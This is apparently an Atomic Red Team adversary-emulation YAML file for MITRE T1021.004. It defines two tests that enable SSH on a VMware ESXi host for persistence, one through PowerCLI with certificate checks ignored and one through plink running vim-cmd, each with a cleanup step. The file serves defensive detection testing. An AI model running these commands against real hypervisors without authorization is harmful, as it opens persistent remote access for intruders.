attack_technique: T1021.004
display_name: 'Remote Services: SSH'
atomic_tests:
- name: ESXi - Enable SSH via PowerCLI
  auto_generated_guid: 8f6c14d1-f13d-4616-b7fc-98cc69fe56ec
  description: |
    An adversary enables the SSH service on a ESXi host to maintain persistent access to the host and to carryout subsequent operations.
  supported_platforms:
  - windows
  input_arguments:
    vm_host:
      description: Specify the host name of the ESXi Server
      type: string
      default: atomic.local
    vm_user:
      description: Specify the privilege user account on ESXi Server
      type: string
      default: root
    vm_pass:
      description: Specify the privilege user password on ESXi Server
      type: string
      default: pass
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Check if VMWARE PowerCLI PowerShell Module is installed.
    prereq_command: |
      $RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable
      if (-not $RequiredModule) {exit 1}
    get_prereq_command: |
      Install-Module -Name VMware.PowerCLI
  executor:
    command: |
      Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
      Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
      Get-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq "TSM-SSH" } | Start-VMHostService -Confirm:$false

    cleanup_command: |
      Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
      Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
      Get-VMHostService -VMHost #{vm_host} | Where-Object {$_.Key -eq "TSM-SSH" } | Stop-VMHostService -Confirm:$false
    name: powershell
    elevation_required: true
- name: ESXi - Enable SSH via VIM-CMD
  auto_generated_guid: 280812c8-4dae-43e9-a74e-1d08ab997c0e
  description: |
    An adversary enables SSH on an ESXi host to maintain persistence and creeate another command execution interface.
    [Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#enable%20service)
  supported_platforms:
  - windows
  input_arguments:
    vm_host:
      description: Specify the host name or IP of the ESXi server.
      type: string
      default: atomic.local
    vm_user:
      description: Specify the privilege user account on the ESXi server.
      type: string
      default: root
    vm_pass:
      description: Specify the privileged user's password.
      type: string
      default: password
    plink_file:
      description: Path to Plink
      type: path
      default: 'PathToAtomicsFolder\..\ExternalPayloads\plink.exe'
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Check if we have plink
    prereq_command: |
      if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
      Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
  executor:
    command: |
      echo "" | "#{plink_file}" -batch "#{vm_host}" -ssh -l #{vm_user} -pw "#{vm_pass}" "vim-cmd hostsvc/enable_ssh"
    cleanup_command: |
      echo "" | "#{plink_file}" -batch "#{vm_host}" -ssh -l #{vm_user} -pw "#{vm_pass}" "vim-cmd hostsvc/disable_ssh"
    name: command_prompt
    elevation_required: false